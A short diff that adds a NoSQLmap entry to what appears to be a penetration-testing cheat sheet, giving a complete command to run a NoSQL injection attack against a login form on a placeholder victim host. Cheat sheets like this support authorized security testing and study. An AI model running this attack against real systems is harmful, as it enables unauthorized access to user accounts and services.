@@ -412,6 +412,12 @@ Create a python webserver
 python -m SimpleHTTPServer 80
 ```
 
+## NoSQLmap
+
+```text
+python nosqlmap.py --attack 2 --victim host.name --webPort 80 --uri / --httpMethod POST --postData username,test_user,password,test_password,login,login --injectedParameter 3 --injectSize 4 --injectFormat 2 --savePath output.log --verb ON
+```
+
 ### Searchsploit
 
 Search exploit
